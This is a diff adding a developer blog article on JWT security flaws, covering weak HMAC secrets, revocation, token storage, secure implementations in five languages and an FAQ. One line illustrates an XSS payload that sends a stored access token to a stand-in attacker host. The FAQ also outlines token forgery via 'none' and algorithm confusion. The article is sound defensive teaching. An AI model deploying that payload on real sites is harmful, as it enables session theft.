+decoded = jwt.decode(
+    token,
+    SECRET_KEY,
+    algorithms=["HS256"],
+    audience="https://api.yourapp.com",     # Must match aud claim
+    issuer="https://auth.yourapp.com",      # Must match iss claim
+    options={"verify_exp": True}
+)
+
+// Go — golang-jwt/jwt
+claims := jwt.MapClaims{}
+token, err := jwt.ParseWithClaims(tokenString, claims, keyFunc,
+    jwt.WithAudience("https://api.yourapp.com"),
+    jwt.WithIssuer("https://auth.yourapp.com"),
+    jwt.WithExpirationRequired(),
+)</code></pre>
+  </div>
+
+  <!-- VULN 7 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">7. Weak HMAC secret</div>
+      <span class="sev-badge sev-high">High</span>
+    </div>
+    <p>HS256 requires a secret that is at least 256 bits (32 bytes) to achieve its designed security level. Short secrets, dictionary words, or reused secrets from other systems can be brute-forced offline — an attacker who captures a token can attempt signature forgery without ever hitting your server. Common secrets I've seen in real codebases: <code>"secret"</code>, <code>"jwt_secret"</code>, <code>"password"</code>, <code>"1234567890123456"</code>.</p>
+    <div class="fix-label">Fix</div>
+    <pre><code># Generate a cryptographically strong HS256 secret
+python3 -c "import secrets; print(secrets.token_hex(32))"
+# Output: a 64-character hex string (256 bits of entropy)
+
+# Node.js
+node -e "require('crypto').randomBytes(32).toString('hex')|0" 
+# Or: crypto.randomBytes(32).toString('base64')
+
+# Store in environment variable — never hardcode in source code
+SECRET_KEY = os.environ["JWT_SECRET"]  # Not "my_jwt_secret_key"</code></pre>
+  </div>
+
+  <!-- VULN 8 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">8. No revocation mechanism (missing jti)</div>
+      <span class="sev-badge sev-medium">Medium</span>
+    </div>
+    <p>JWTs are stateless by design — the server doesn't store them, so it can't revoke them. If a user logs out, changes their password, or if you detect a compromised account, the existing tokens remain valid until they expire. For a 15-minute token this is acceptable. For a 24-hour token it means an attacker who stole a token before a password change still has access for up to 24 hours after.</p>
+    <div class="fix-label">Fix</div>
+    <p>Use short-lived access tokens to minimize the revocation window. For scenarios requiring immediate revocation, maintain a server-side blocklist of <code>jti</code> values. A Redis SET with the token's expiry TTL is the most common implementation.</p>
+    <pre><code># Redis-based JWT blocklist
+import redis
+r = redis.Redis()
+
+def revoke_token(jti: str, exp: int) -> None:
+    """Add token ID to blocklist until it expires."""
+    ttl = exp - int(time.time())
+    if ttl > 0:
+        r.setex(f"revoked:{jti}", ttl, "1")
+
+def is_token_revoked(jti: str) -> bool:
+    return r.exists(f"revoked:{jti}") > 0
+
+# In your middleware
+decoded = jwt.decode(token, key, algorithms=["HS256"], ...)
+if is_token_revoked(decoded.get("jti")):
+    raise AuthenticationError("Token has been revoked")</code></pre>
+  </div>
+
+  <!-- VULN 9 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">9. Token stored in localStorage (XSS exposure)</div>
+      <span class="sev-badge sev-high">High</span>
+    </div>
+    <p>localStorage is accessible to any JavaScript running on your page — including scripts injected via XSS, compromised third-party libraries, and browser extensions. A single XSS vulnerability anywhere on your site becomes a full token theft. The attack is simple:</p>
+    <pre><code>// XSS payload: one line to steal all stored tokens
+fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))</code></pre>
+    <div class="fix-label">Fix</div>
+    <p>Keep access tokens in memory (a JavaScript variable). Use an httpOnly, Secure, SameSite=Strict cookie for the refresh token. httpOnly cookies are invisible to JavaScript — XSS cannot read them. See the storage comparison table below for the full analysis.</p>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 5 — IMPLEMENTATION
+  ══════════════════════════════════ -->
+  <h2 id="implementation">Secure implementation in 5 languages</h2>
+
+  <p>Each snippet shows the full secure pattern: token creation with all recommended claims, token verification with explicit algorithm and audience, and error handling. These are starting points — adapt the secret management to your infrastructure (environment variables, AWS Secrets Manager, HashiCorp Vault).</p>
+
+  <div class="lang-tabs">
+    <button class="lang-tab active" onclick="switchLang('python')">Python</button>
+    <button class="lang-tab" onclick="switchLang('node')">Node.js</button>
+    <button class="lang-tab" onclick="switchLang('go')">Go</button>
+    <button class="lang-tab" onclick="switchLang('java')">Java</button>
+    <button class="lang-tab" onclick="switchLang('php')">PHP</button>
+  </div>
+
+  <div class="code-block visible" id="lang-python">
+    <pre><code># pip install PyJWT cryptography
+import jwt, uuid, os
+from datetime import datetime, timedelta, timezone
+
+SECRET_KEY = os.environ["JWT_SECRET"]  # Min 256 bits (32 bytes)
+ISSUER     = "https://auth.yourapp.com"
+AUDIENCE   = "https://api.yourapp.com"
+
+# ── Create access token ───────────────────────────────────────
+def create_access_token(user_id: str, role: str = "user") -> str:
+    now = datetime.now(timezone.utc)
+    return jwt.encode({
+        "sub": user_id,
+        "role": role,
+        "iss": ISSUER,
+        "aud": AUDIENCE,
+        "iat": now,
+        "exp": now + timedelta(minutes=15),
+        "jti": str(uuid.uuid4()),  # Unique ID for revocation
+    }, SECRET_KEY, algorithm="HS256")
+
+# ── Create refresh token (longer-lived, minimal claims) ───────
+def create_refresh_token(user_id: str, session_id: str) -> str:
+    now = datetime.now(timezone.utc)
+    return jwt.encode({
+        "sub": user_id,
+        "session_id": session_id,  # Links to server-side session
+        "iss": ISSUER,
+        "aud": AUDIENCE,
+        "iat": now,
+        "exp": now + timedelta(days=7),
+        "jti": str(uuid.uuid4()),
+    }, SECRET_KEY, algorithm="HS256")
+
+# ── Verify token ──────────────────────────────────────────────
+def verify_token(token: str) -> dict:
+    try:
+        return jwt.decode(
+            token, SECRET_KEY,
+            algorithms=["HS256"],          # Explicit allowlist — never ["HS256", "none"]
+            audience=AUDIENCE,             # Validate audience
+            issuer=ISSUER,                 # Validate issuer
+            options={
+                "verify_exp": True,        # Always check expiry
+                "verify_iss": True,
+                "verify_aud": True,
+                "require": ["sub", "exp", "iat", "jti"]  # Required claims
+            }
+        )
+    except jwt.ExpiredSignatureError:
+        raise AuthenticationError("Token has expired")
+    except jwt.InvalidTokenError as e:
+        raise AuthenticationError(f"Invalid token: {e}")</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-node">
+    <pre><code>// npm install jsonwebtoken
+const jwt  = require('jsonwebtoken');
+const { v4: uuidv4 } = require('uuid');
+
+const SECRET_KEY = process.env.JWT_SECRET;
+const ISSUER     = 'https://auth.yourapp.com';
+const AUDIENCE   = 'https://api.yourapp.com';
+
+// ── Create access token ───────────────────────────────────────
+function createAccessToken(userId, role = 'user') {
+  return jwt.sign(
+    {
+      sub:  userId,
+      role: role,
+      jti:  uuidv4(),
+    },
+    SECRET_KEY,
+    {
+      algorithm: 'HS256',
+      expiresIn: '15m',
+      issuer:    ISSUER,
+      audience:  AUDIENCE,
+    }
+  );
+}
+
+// ── For RS256 (recommended for microservices) ─────────────────
+const fs = require('fs');
+const PRIVATE_KEY = fs.readFileSync('./keys/private.pem');
+const PUBLIC_KEY  = fs.readFileSync('./keys/public.pem');
+
+function createAccessTokenRS256(userId, role = 'user') {
+  return jwt.sign(
+    { sub: userId, role, jti: uuidv4() },
+    PRIVATE_KEY,
+    { algorithm: 'RS256', expiresIn: '15m', issuer: ISSUER, audience: AUDIENCE }
+  );
+}
+
+// ── Verify token ──────────────────────────────────────────────
+function verifyToken(token) {
+  try {
+    return jwt.verify(token, SECRET_KEY, {
+      algorithms: ['HS256'],  // Never accept RS256 here (confusion attack)
+      issuer:     ISSUER,
+      audience:   AUDIENCE,
+      clockTolerance: 30,     // 30-second clock skew tolerance
+    });
+  } catch (err) {
+    if (err.name === 'TokenExpiredError') throw new Error('Token expired');
+    if (err.name === 'JsonWebTokenError') throw new Error(`Invalid token: ${err.message}`);
+    throw err;
+  }
+}
+
+// ── Express.js middleware ─────────────────────────────────────
+function authenticate(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader?.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Missing Authorization header' });
+  }
+  const token = authHeader.slice(7);
+  try {
+    req.user = verifyToken(token);
+    next();
+  } catch (err) {
+    res.status(401).json({ error: err.message });
+  }
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-go">
+    <pre><code>// go get github.com/golang-jwt/jwt/v5
+package auth
+
+import (
+    "errors"
+    "os"
+    "time"
+
+    "github.com/golang-jwt/jwt/v5"
+    "github.com/google/uuid"
+)
+
+var (
+    secretKey = []byte(os.Getenv("JWT_SECRET"))
+    issuer    = "https://auth.yourapp.com"
+    audience  = "https://api.yourapp.com"
+)
+
+type Claims struct {
+    Role string `json:"role"`
+    jwt.RegisteredClaims
+}
+
+// CreateAccessToken creates a short-lived access token
+func CreateAccessToken(userID, role string) (string, error) {
+    now := time.Now()
+    claims := Claims{
+        Role: role,
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   userID,
+            Issuer:    issuer,
+            Audience:  jwt.ClaimStrings{audience},
+            IssuedAt:  jwt.NewNumericDate(now),
+            ExpiresAt: jwt.NewNumericDate(now.Add(15 * time.Minute)),
+            ID:        uuid.New().String(), // jti
+        },
+    }
+    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+    return token.SignedString(secretKey)
+}
+
+// VerifyToken parses and validates a JWT token
+func VerifyToken(tokenString string) (*Claims, error) {
+    token, err := jwt.ParseWithClaims(
+        tokenString,
+        &Claims{},
+        func(token *jwt.Token) (interface{}, error) {
+            // Verify the signing method — prevent algorithm confusion
+            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+                return nil, errors.New("unexpected signing method")
+            }
+            return secretKey, nil
+        },
+        jwt.WithAudience(audience),
+        jwt.WithIssuer(issuer),
+        jwt.WithExpirationRequired(),
+        jwt.WithIssuedAt(),
+    )
+    if err != nil {
+        return nil, err
+    }
+    claims, ok := token.Claims.(*Claims)
+    if !ok {
+        return nil, errors.New("invalid claims")
+    }
+    return claims, nil
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-java">
+    <pre><code>// Maven: io.jsonwebtoken:jjwt-api:0.12.6 + jjwt-impl + jjwt-jackson
+import io.jsonwebtoken.*;
+import io.jsonwebtoken.security.Keys;
+import javax.crypto.SecretKey;
+import java.time.*;
+import java.util.UUID;
+
+public class JwtService {
+    private final SecretKey key;
+    private final String issuer   = "https://auth.yourapp.com";
+    private final String audience = "https://api.yourapp.com";
+
+    public JwtService() {
+        // Load from environment — minimum 256 bits for HS256
+        String secret = System.getenv("JWT_SECRET");
+        this.key = Keys.hmacShaKeyFor(secret.getBytes());
+    }
+
+    // ── Create access token ───────────────────────────────────
+    public String createAccessToken(String userId, String role) {
+        Instant now = Instant.now();
+        return Jwts.builder()
+            .subject(userId)
+            .claim("role", role)
+            .issuer(issuer)
+            .audience().add(audience).and()
+            .issuedAt(Date.from(now))
+            .expiration(Date.from(now.plus(15, ChronoUnit.MINUTES)))
+            .id(UUID.randomUUID().toString())   // jti
+            .signWith(key, Jwts.SIG.HS256)      // Explicit algorithm
+            .compact();
+    }
+
+    // ── Verify token ──────────────────────────────────────────
+    public Claims verifyToken(String token) {
+        try {
+            return Jwts.parser()
+                .verifyWith(key)
+                .requireIssuer(issuer)
+                .requireAudience(audience)
+                .build()
+                .parseSignedClaims(token)
+                .getPayload();
+        } catch (ExpiredJwtException e) {
+            throw new AuthenticationException("Token expired");
+        } catch (JwtException e) {
+            throw new AuthenticationException("Invalid token: " + e.getMessage());
+        }
+    }
+}</code></pre>
+  </div>
+
+  <div class="code-block" id="lang-php">
+    <pre><code>&lt;?php
+// composer require firebase/php-jwt
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+use Firebase\JWT\ExpiredException;
+use Firebase\JWT\SignatureInvalidException;
+
+class JwtService {
+    private string $secretKey;
+    private string $issuer   = 'https://auth.yourapp.com';
+    private string $audience = 'https://api.yourapp.com';
+    private string $algo     = 'HS256';
+
+    public function __construct() {
+        $this->secretKey = getenv('JWT_SECRET') ?: die('JWT_SECRET not set');
+    }
+
+    // ── Create access token ───────────────────────────────────
+    public function createAccessToken(string $userId, string $role = 'user'): string {
+        $now = time();
+        $payload = [
+            'sub'  => $userId,
+            'role' => $role,
+            'iss'  => $this->issuer,
+            'aud'  => $this->audience,
+            'iat'  => $now,
+            'exp'  => $now + 900,    // 15 minutes
+            'nbf'  => $now,
+            'jti'  => bin2hex(random_bytes(16)),  // Cryptographically random
+        ];
+        return JWT::encode($payload, $this->secretKey, $this->algo);
+    }
+
+    // ── Verify token ──────────────────────────────────────────
+    public function verifyToken(string $token): object {
+        try {
+            $decoded = JWT::decode(
+                $token,
+                new Key($this->secretKey, $this->algo)
+            );
+            // firebase/php-jwt does not verify iss/aud by default
+            if ($decoded->iss !== $this->issuer) {
+                throw new \Exception('Invalid issuer');
+            }
+            if ($decoded->aud !== $this->audience) {
+                throw new \Exception('Invalid audience');
+            }
+            return $decoded;
+        } catch (ExpiredException $e) {
+            throw new AuthenticationException('Token has expired');
+        } catch (SignatureInvalidException $e) {
+            throw new AuthenticationException('Invalid signature');
+        } catch (\Exception $e) {
+            throw new AuthenticationException('Invalid token: ' . $e->getMessage());
+        }
+    }
+}
+?&gt;</code></pre>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 6 — TOKEN PATTERN
+  ══════════════════════════════════ -->
+  <h2 id="token-pattern">The correct access + refresh token pattern</h2>
+
+  <p>The security goal is to keep the access token short-lived enough that theft doesn't matter much, while still giving users a session that doesn't require re-authentication every 15 minutes. The solution that the industry has converged on — used by Google, GitHub, and Stripe — is the access + refresh token pair with rotation.</p>
+
+  <div class="seq-diagram" aria-label="Access and refresh token sequence diagram">
+    <div class="seq-step"><span class="seq-actor">User</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/login {username, password}</span></div>
+    <div class="seq-step"><span class="seq-actor">Server</span> <span class="seq-arrow">→→</span> <span class="seq-label">access_token (15 min, in response body) + refresh_token (7 days, httpOnly cookie)</span></div>
+    <div class="seq-comment">  # Client stores access_token in memory (JS variable), never in localStorage</div>
+
+    <div class="seq-step"><span class="seq-actor">User</span> <span class="seq-arrow">→→</span> <span class="seq-label">GET /api/data  Authorization: Bearer &lt;access_token&gt;</span></div>
+    <div class="seq-step"><span class="seq-actor">Server</span> <span class="seq-arrow">→→</span> <span class="seq-label">200 OK {data}</span></div>
+    <div class="seq-comment">  # access_token expires after 15 min</div>
+
+    <div class="seq-step"><span class="seq-actor">User</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/refresh  (refresh_token sent automatically via httpOnly cookie)</span></div>
+    <div class="seq-step"><span class="seq-actor">Server</span> <span class="seq-arrow">→→</span> <span class="seq-label">new access_token (15 min) + NEW refresh_token (invalidates old one) ← ROTATION</span></div>
+    <div class="seq-comment">  # Old refresh_token is immediately invalidated in the database</div>
+
+    <div class="seq-step"><span class="seq-actor">User</span> <span class="seq-arrow">→→</span> <span class="seq-label">POST /auth/logout</span></div>
+    <div class="seq-step"><span class="seq-actor">Server</span> <span class="seq-arrow">→→</span> <span class="seq-label">Invalidates refresh_token in DB + clears cookie + adds access jti to blocklist</span></div>
+  </div>
+
+  <p>The rotation step is what makes theft detectable. When a legitimate user tries to use their refresh token after an attacker has already used it (because rotation issued a new one to the attacker), the legitimate user's token is already invalidated. The server detects a replay attempt on a revoked refresh token and can immediately invalidate the entire session family.</p>
+
+  <pre><code># Server-side refresh token rotation (Python + Redis)
+import redis, secrets
+r = redis.Redis()
+
+def rotate_refresh_token(old_refresh_token: str, user_id: str) -> dict:
+    """
+    Validate old refresh token, issue new one, invalidate old one.
+    If the old token is already revoked, possible token theft detected.
+    """
+    token_key = f"refresh:{user_id}:{old_refresh_token}"
+
+    # Check if token exists and is valid
+    if not r.exists(token_key):
+        # Old token already used or revoked — possible token theft
+        # Invalidate ALL refresh tokens for this user as a safety measure
+        r.delete(*r.keys(f"refresh:{user_id}:*"))
+        raise SecurityError("Refresh token reuse detected — session invalidated")
+
+    # Revoke the old token immediately
+    r.delete(token_key)
+
+    # Issue new refresh token
+    new_token = secrets.token_urlsafe(32)
+    r.setex(f"refresh:{user_id}:{new_token}", 604800, "valid")  # 7 days TTL
+
+    return {
+        "access_token":  create_access_token(user_id),
+        "refresh_token": new_token  # Send in httpOnly cookie
+    }</code></pre>
+
+  <!-- ══════════════════════════════════
+       SECTION 7 — STORAGE
+  ══════════════════════════════════ -->
+  <h2 id="storage">Token storage: the complete comparison</h2>
+
+  <p>This is the question I get asked most often about JWTs. The short answer: <strong>never localStorage, httpOnly cookie for refresh tokens, memory for access tokens</strong>. The long answer is below.</p>
+
+  <div class="storage-row">
+    <div class="storage-cell header">Storage</div>
+    <div class="storage-cell header">XSS resistant</div>
+    <div class="storage-cell header">CSRF resistant</div>
+    <div class="storage-cell header">Recommendation</div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">localStorage</div>
+    <div class="storage-cell"><span class="bad">❌ No</span> — any JS on page reads it</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span> — not sent automatically</div>
+    <div class="storage-cell"><span class="bad">Never use for tokens</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">sessionStorage</div>
+    <div class="storage-cell"><span class="bad">❌ No</span> — same XSS exposure as localStorage</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span></div>
+    <div class="storage-cell"><span class="bad">Never use for tokens</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">httpOnly Cookie</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span> — JS cannot read it</div>
+    <div class="storage-cell"><span class="warn-text">⚠️ No*</span> — sent automatically with requests</div>
+    <div class="storage-cell"><span class="ok">Use for refresh tokens</span> + add CSRF token</div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">Memory (JS var)</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span> — wiped on reload</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span> — must be manually attached</div>
+    <div class="storage-cell"><span class="ok">Best for access tokens</span></div>
+  </div>
+  <div class="storage-row">
+    <div class="storage-cell name">Service Worker</div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span></div>
+    <div class="storage-cell"><span class="ok">✅ Yes</span></div>
+    <div class="storage-cell"><span class="warn-text">Advanced</span> — complex but excellent</div>
+  </div>
+
+  <p>The <code>*</code> next to CSRF resistance for httpOnly cookies: CSRF attacks work by tricking a browser into sending a request with the victim's cookies attached. Mitigate this with <code>SameSite=Strict</code> (or <code>Lax</code>) and a CSRF token in a custom header. The combination of <code>httpOnly; Secure; SameSite=Strict</code> provides good protection against both XSS and CSRF for the refresh token.</p>
+
+  <pre><code># Setting the refresh token cookie correctly (Python/Flask example)
+from flask import make_response
+
+response = make_response({"access_token": access_token})
+response.set_cookie(
+    "refresh_token",
+    value=refresh_token,
+    httponly=True,       # Not accessible to JavaScript
+    secure=True,         # HTTPS only
+    samesite="Strict",   # Not sent on cross-site requests (CSRF mitigation)
+    max_age=604800,      # 7 days
+    path="/auth/refresh" # Only sent to the refresh endpoint, not everywhere
+)
+return response</code></pre>
+
+  <div style="text-align:center;margin:32px 0">
+    <a href="/tools/jwt-decoder/" class="btn-cta">🔍 Analyze your JWT — security grade, vulnerability detection, free</a>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 8 — FAQ
+  ══════════════════════════════════ -->
+  <h2 id="faq">Frequently asked questions</h2>
+
+  <div>
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">What is the algorithm "none" vulnerability in JWT?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">When a JWT specifies <code>alg: none</code> in its header, it carries no signature at all. Vulnerable servers that read the algorithm from the token and trust it skip verification entirely. An attacker can forge a token with any claims — including <code>admin: true</code> or any user ID — by simply base64url-encoding their header and payload without signing anything. The fix is to never read the algorithm from the token and to maintain an explicit allowlist in your verification code, such as <code>algorithms=["HS256"]</code>.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">What is the RS256/HS256 algorithm confusion attack?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">If a server normally verifies tokens with RS256 but also accepts HS256, an attacker who has obtained the server's public key can sign a forged token using that public key as the HMAC secret for HS256. The server verifies it using its own public key — and accepts it, because the HMAC verification of "public key as secret" passes when the same key was used to sign. The fix: specify a strict algorithm allowlist in your JWT library. If your server uses RS256, it must reject HS256 tokens unconditionally.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Should I store JWT tokens in localStorage or cookies?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Never store JWT tokens in localStorage or sessionStorage. Both are fully readable by any JavaScript running on your page, including XSS payloads and compromised third-party scripts. For access tokens, use a JavaScript variable in memory — wiped on page reload. For refresh tokens, use an httpOnly, Secure, SameSite=Strict cookie, which is invisible to JavaScript. Add a CSRF token in a custom header to protect against CSRF attacks on the refresh endpoint.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">What is refresh token rotation?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Refresh token rotation means issuing a brand new refresh token every time an access token is refreshed, and immediately invalidating the old one. The key security benefit is detection of token theft: if an attacker steals a refresh token and uses it, the server issues a new one to the attacker and invalidates the old one. When the legitimate user tries to use their (now revoked) token, the server detects a reuse attempt on an invalidated token and can invalidate the entire session family. Without rotation, a stolen refresh token can be used indefinitely alongside the legitimate user.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Why should I never put sensitive data in a JWT payload?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">JWT payloads are Base64url-encoded, not encrypted. Base64url is a completely reversible transformation — anyone who has the token can decode every field without knowing any secret key. This includes servers, CDNs, log aggregators, browser extensions, and anyone who intercepts network traffic over HTTP. If you need to transmit encrypted claims, use <strong>JWE (JSON Web Encryption)</strong> — a distinct standard (RFC 7516) that provides confidentiality.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">What is a good expiration time for a JWT access token?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">15 minutes is the most common recommendation for security-sensitive applications. This limits the window of exploitation if a token is stolen — an attacker who captures a 15-minute token has at most 15 minutes of access. Pair this with a 7-day refresh token stored in an httpOnly cookie. For lower-risk applications (public content, non-sensitive data), 1 hour is acceptable. For high-security contexts (banking, healthcare), consider 5 minutes or even shorter with frequent silent refresh.</p>
+      </div>
+    </details>
+  </div>
+
+  <!-- ══════════════════════════════════
+       REFERENCES
+  ══════════════════════════════════ -->
+  <section class="references">
+    <h3>Sources and references</h3>
+    <ul class="ref-list">
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7519" target="_blank" rel="noopener noreferrer">RFC 7519 — JSON Web Token (JWT), IETF, 2015</a> — the official JWT specification defining the format, claims, and validation rules.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7518" target="_blank" rel="noopener noreferrer">RFC 7518 — JSON Web Algorithms (JWA), IETF, 2015</a> — cryptographic algorithm definitions for JWT signing and encryption.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7516" target="_blank" rel="noopener noreferrer">RFC 7516 — JSON Web Encryption (JWE), IETF, 2015</a> — the encryption standard for confidential JWT payloads.</li>
+      <li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener noreferrer">Tim McLean — Critical vulnerabilities in JSON Web Token libraries (Auth0 Blog, 2015)</a> — the original disclosure of the algorithm confusion and "none" vulnerabilities.</li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens" target="_blank" rel="noopener noreferrer">OWASP — Testing JSON Web Tokens (WSTG-SESS-10)</a> — OWASP's official testing guide for JWT vulnerabilities.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP — JWT Cheat Sheet</a> — actionable security guidance for JWT implementation across languages.</li>
+      <li><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener noreferrer">PortSwigger — JWT attacks (Web Security Academy)</a> — in-depth coverage of algorithm confusion, header injection, and kid attacks.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749 — OAuth 2.0 Authorization Framework, IETF, 2012</a> — the authorization framework that defines access and refresh token concepts.</li>
+      <li><a href="https://datatracker.ietf.org/doc/html/rfc6819" target="_blank" rel="noopener noreferrer">RFC 6819 — OAuth 2.0 Threat Model and Security Considerations, IETF, 2013</a> — threat analysis for token-based authentication systems.</li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener noreferrer">MDN — Set-Cookie: HttpOnly, Secure, SameSite attributes</a> — browser behavior for secure cookie attributes.</li>
+    </ul>
+  </section>
+
+  <!-- ══════════════════════════════════
+       RELATED TOOLS
+  ══════════════════════════════════ -->
+  <div class="related-tools">
+    <h3>Related DevToolbox tools</h3>
+    <ul>
+      <li><a href="/tools/jwt-decoder/">→ JWT Decoder & Security Analyzer</a> — decode any JWT, get a security grade, detect algorithm vulnerabilities and missing claims</li>
+      <li><a href="/tools/unix-timestamp-converter/">→ Unix Timestamp Converter</a> — convert <code>exp</code>, <code>iat</code>, <code>nbf</code> claim values to readable dates</li>
+      <li><a href="/tools/http-header-analyzer/">→ HTTP Header Analyzer</a> — analyze the Authorization header and the Set-Cookie header that carries refresh tokens</li>
+      <li><a href="/tools/base64-encoder/">→ Base64 Encoder / Decoder</a> — manually inspect JWT header and payload Base64url sections</li>
+      <li><a href="/tools/uuid-generator/">→ UUID Generator</a> — generate cryptographically random UUIDs for <code>jti</code> claims</li>
+    </ul>
+  </div>
+
+  </div><!-- /articleBody -->
+</article>
+</main>
+
+<footer class="footer">
+  <p>&copy; 2026 <a href="/">DevToolbox</a> — Free tools for developers.
+  <a href="/fr/blog/">Blog</a> | <a href="/tools/about/">About</a> | <a href="/tools/contact/">Contact</a></p>
+</footer>
+</div>
+
+<script>
+function switchLang(lang) {
+  ['python','node','go','java','php'].forEach(l => {
+    const el = document.getElementById('lang-' + l);
+    if (el) el.classList.toggle('visible', l === lang);
+  });
+  document.querySelectorAll('.lang-tab').forEach((t, i) => {
+    t.classList.toggle('active', ['python','node','go','java','php'][i] === lang);
+  });
+}
+
+function toggleTheme() {
+  const dark = document.body.classList.toggle('dark');
+  document.getElementById('themeBtn').textContent = dark ? '☀️ Light' : '🌙 Dark';
+  localStorage.setItem('devtoolbox-theme', dark ? 'dark' : 'light');
+}
+(function() {
+  const s = localStorage.getItem('devtoolbox-theme') || 'light';
+  if (s === 'dark') {
+    document.body.classList.add('dark');
+    document.getElementById('themeBtn').textContent = '☀️ Light';
+  }
+})();
+</script>
+</body>
+</html>
